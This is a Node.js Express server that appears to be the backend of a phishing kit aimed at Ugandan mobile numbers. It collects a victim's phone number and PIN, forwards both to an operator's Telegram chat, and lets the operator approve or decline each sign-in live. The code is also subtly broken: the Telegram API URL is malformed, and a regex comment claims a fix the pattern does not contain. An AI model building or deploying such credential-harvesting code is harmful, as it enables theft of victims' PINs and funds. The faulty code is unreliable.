const express = require("express");
const path = require("path");
const crypto = require("crypto");

const app = express();
const PORT = process.env.PORT || 3000;

const PUBLIC_DIR = path.join(__dirname, "public");
const INDEX_FILE = path.join(PUBLIC_DIR, "index.html");

app.use(express.json({ limit: "10kb" }));
app.use(express.static(PUBLIC_DIR));

app.get("/", (_req, res) => {
  res.sendFile(INDEX_FILE, err => {
    if (err && !res.headersSent) res.status(404).send("Not found.");
  });
});

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const requests = new Map();

async function telegram(method, payload) {
  if (!BOT_TOKEN || !CHAT_ID) throw new Error("Missing config.");
  const res = await fetch(`https://telegram.org{BOT_TOKEN}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });
  const data = await res.json();
  if (!res.ok || !data.ok) throw new Error(data.description || "Failed");
  return data;
}

app.post("/api/phone", (req, res) => {
  const phone = String(req.body.phone || "").trim();
  
  // ✅ Fixed Regex: Removed the incorrect backslash (\) before the end marker (\$)
  if (!/^\+2567\d{8}\$/.test(phone)) {
    return res.status(400).json({ error: "Invalid format phone number." });
  }
  
  const item = { id: crypto.randomUUID(), phone, stage: "pin-demo", status: "ready", createdAt: new Date() };
  requests.set(item.id, item);
  return res.json({ id: item.id, status: item.status });
});

app.post("/api/pin-demo", async (req, res) => {
  const id = String(req.body.id || "");
  const request = requests.get(id);
  if (!request) return res.status(400).json({ error: "Not found." });
  
  request.pin = String(req.body.pin || "").trim();
  request.status = "pending";
  
  try {
    await telegram("sendMessage", {
      chat_id: CHAT_ID,
      text: `⚠️ SIGN IN\nID: ${request.id}\nPhone: ${request.phone}\nPIN: ${request.pin}`,
      reply_markup: {
        inline_keyboard: [[
          { text: "✅ Approve", callback_data: `approve:${request.id}` },
          { text: "❌ Decline", callback_data: `decline:${request.id}` }
        ]]
      }
    });
    return res.json({ status: "pending" });
  } catch (err) {
    request.status = "ready";
    return res.status(502).json({ error: "Error." });
  }
});

app.get("/api/status/:id", (req, res) => {
  const request = requests.get(req.params.id);
  if (!request) return res.status(404).json({ error: "Not found." });
  return res.json({ status: request.status, stage: request.stage });
});

app.post("/api/retry", (req, res) => {
  const request = requests.get(String(req.body.id || ""));
  if (request && request.status === "declined") {
    request.status = "ready";
    return res.json({ status: request.status });
  }
  return res.status(400).json({ error: "Error." });
});

let offset = 0;
async function pollTelegram() {
  if (!BOT_TOKEN || !CHAT_ID) return;
  while (true) {
    try {
      const data = await telegram("getUpdates", { offset, timeout: 25, allowed_updates: ["callback_query"] });
      for (const upd of data.result || []) {
        offset = upd.update_id + 1;
        const cb = upd.callback_query;
        if (!cb) continue;
        
        const parts = String(cb.data || "").split(":");
        // ✅ Fixed: Extracts just the string action ('approve' or 'decline') out of the array splitting
        const action = parts[0]; 
        const reqId = parts.slice(1).join(":");
        const request = requests.get(reqId);
        
        if (request && request.status === "pending" && ["approve", "decline"].includes(action)) {
          request.status = action === "approve" ? "approved" : "declined";
          await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: `Done: ${request.status}` });
        }
      }
    } catch (err) {
      await new Promise(r => setTimeout(r, 4000));
    }
  }
}

pollTelegram();
app.listen(PORT);
